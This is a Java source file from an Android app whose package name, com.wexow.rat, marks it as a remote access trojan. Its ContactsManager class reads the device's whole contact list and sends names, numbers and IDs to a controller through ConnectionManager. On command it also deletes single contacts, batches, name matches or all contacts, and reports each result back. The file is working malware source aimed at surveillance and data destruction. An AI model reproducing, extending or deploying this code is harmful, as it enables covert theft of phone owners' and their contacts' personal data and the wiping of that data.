package com.wexow.rat.managers;

import android.content.ContentProviderOperation;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.provider.ContactsContract;
import android.util.Log;

import com.wexow.rat.core.ConnectionManager;

import org.json.JSONArray;
import org.json.JSONObject;

import java.util.ArrayList;

public class ContactsManager {
    private static final String TAG = "ContactsManager";

    public static void getContacts(Context ctx) {
        new Thread(() -> {
            try {
                JSONArray list = new JSONArray();
                
                Cursor c = ctx.getContentResolver().query(
                    ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                    new String[]{
                        ContactsContract.CommonDataKinds.Phone.CONTACT_ID,  
                        ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                        ContactsContract.CommonDataKinds.Phone.NUMBER,
                        ContactsContract.CommonDataKinds.Phone._ID,          
                        ContactsContract.CommonDataKinds.Phone.TYPE, 
                    },
                    null, null,
                    ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC");

                if (c != null) {
                    while (c.moveToNext()) {
                        JSONObject jo = new JSONObject();
                        jo.put("contactId", c.getLong(0));
                        jo.put("name", c.getString(1) != null ? c.getString(1) : "");
                        jo.put("number", c.getString(2) != null ? c.getString(2) : "");
                        jo.put("phoneId", c.getLong(3));
                        jo.put("type", c.getInt(4));
                        list.put(jo);
                    }
                    c.close();
                }

                JSONObject res = new JSONObject();
                res.put("type", "contacts");
                res.put("count", list.length());
                res.put("data", list);
                ConnectionManager.send(res.toString());
                
                Log.e(TAG, "📤 Sent " + list.length() + " contacts");
            } catch (Exception e) {
                Log.e(TAG, "❌ getContacts: " + e.getMessage());
            }
        }).start();
    }

    public static void deleteContact(Context ctx, long contactId) {
        new Thread(() -> {
            try {
                Log.e(TAG, "🗑️ Deleting contact ID: " + contactId);
                
                Uri contactUri = android.content.ContentUris.withAppendedId(
                    ContactsContract.RawContacts.CONTENT_URI, 
                    contactId
                );
                
                int deleted = ctx.getContentResolver().delete(
                    contactUri, null, null
                );
                
                Log.e(TAG, "✅ Deleted RawContact: " + deleted);
                
                if (deleted == 0) {
                    Uri uri = android.content.ContentUris.withAppendedId(
                        ContactsContract.Contacts.CONTENT_URI, 
                        contactId
                    );
                    deleted = ctx.getContentResolver().delete(uri, null, null);
                    Log.e(TAG, "✅ Deleted Contact: " + deleted);
                }
                
                JSONObject res = new JSONObject();
                res.put("type", "contact_deleted");
                res.put("contactId", contactId);
                res.put("success", deleted > 0);
                res.put("count", deleted);
                ConnectionManager.send(res.toString());
                
            } catch (Exception e) {
                Log.e(TAG, "❌ deleteContact: " + e.getMessage());
                
                try {
                    JSONObject res = new JSONObject();
                    res.put("type", "contact_deleted");
                    res.put("contactId", contactId);
                    res.put("success", false);
                    res.put("error", e.getMessage());
                    ConnectionManager.send(res.toString());
                } catch (Exception ignored) {}
            }
        }).start();
    }

    public static void deletePhoneNumber(Context ctx, long phoneId) {
        new Thread(() -> {
            try {
                Log.e(TAG, "🗑️ Deleting phone ID: " + phoneId);
                
                Uri uri = android.content.ContentUris.withAppendedId(
                    ContactsContract.Data.CONTENT_URI, 
                    phoneId
                );
                
                int deleted = ctx.getContentResolver().delete(uri, null, null);
                
                Log.e(TAG, "✅ Deleted phone: " + deleted);
                
                JSONObject res = new JSONObject();
                res.put("type", "contact_phone_deleted");
                res.put("phoneId", phoneId);
                res.put("success", deleted > 0);
                ConnectionManager.send(res.toString());
                
            } catch (Exception e) {
                Log.e(TAG, "❌ deletePhoneNumber: " + e.getMessage());
            }
        }).start();
    }

    public static void deleteMultiple(Context ctx, JSONArray contactIds) {
        new Thread(() -> {
            int deleted = 0;
            int failed = 0;
            
            for (int i = 0; i < contactIds.length(); i++) {
                try {
                    long id = contactIds.getLong(i);
                    
                    Uri uri = android.content.ContentUris.withAppendedId(
                        ContactsContract.RawContacts.CONTENT_URI, id
                    );
                    
                    int count = ctx.getContentResolver().delete(uri, null, null);
                    if (count > 0) deleted++;
                    else failed++;
                    
                    Thread.sleep(100);
                } catch (Exception e) {
                    failed++;
                    Log.e(TAG, "❌ delete #" + i + ": " + e.getMessage());
                }
            }
            
            try {
                JSONObject res = new JSONObject();
                res.put("type", "contacts_deleted_multiple");
                res.put("deleted", deleted);
                res.put("failed", failed);
                res.put("total", contactIds.length());
                ConnectionManager.send(res.toString());
            } catch (Exception ignored) {}
            
            Log.e(TAG, "🗑️ Multiple delete: " + deleted + "/" + contactIds.length());
        }).start();
    }

    public static void deleteByName(Context ctx, String name) {
        new Thread(() -> {
            try {
                Log.e(TAG, "🗑️ Deleting contacts with name: " + name);
                
                Cursor c = ctx.getContentResolver().query(
                    ContactsContract.Contacts.CONTENT_URI,
                    new String[]{ ContactsContract.Contacts._ID },
                    ContactsContract.Contacts.DISPLAY_NAME + " LIKE ?",
                    new String[]{ "%" + name + "%" },
                    null
                );
                
                ArrayList<Long> ids = new ArrayList<>();
                if (c != null) {
                    while (c.moveToNext()) {
                        ids.add(c.getLong(0));
                    }
                    c.close();
                }
                
                Log.e(TAG, "Found " + ids.size() + " contacts matching: " + name);
                
                int deleted = 0;
                for (long id : ids) {
                    try {
                        Uri uri = android.content.ContentUris.withAppendedId(
                            ContactsContract.RawContacts.CONTENT_URI, id
                        );
                        
                        int count = ctx.getContentResolver().delete(uri, null, null);
                        if (count > 0) deleted++;
                        
                        Thread.sleep(100);
                    } catch (Exception e) {
                        Log.e(TAG, "Delete #" + id + " failed: " + e.getMessage());
                    }
                }
                
                JSONObject res = new JSONObject();
                res.put("type", "contacts_deleted_by_name");
                res.put("name", name);
                res.put("found", ids.size());
                res.put("deleted", deleted);
                ConnectionManager.send(res.toString());
                
            } catch (Exception e) {
                Log.e(TAG, "❌ deleteByName: " + e.getMessage());
            }
        }).start();
    }

    public static void deleteAll(Context ctx) {
        new Thread(() -> {
            try {
                Log.e(TAG, "🗑️ Deleting ALL contacts...");
                
                int deleted = ctx.getContentResolver().delete(
                    ContactsContract.RawContacts.CONTENT_URI,
                    null, null
                );
                
                JSONObject res = new JSONObject();
                res.put("type", "all_contacts_deleted");
                res.put("count", deleted);
                ConnectionManager.send(res.toString());
                
                Log.e(TAG, "✅ Deleted all: " + deleted);
                
            } catch (Exception e) {
                Log.e(TAG, "❌ deleteAll: " + e.getMessage());
            }
        }).start();
    }
}
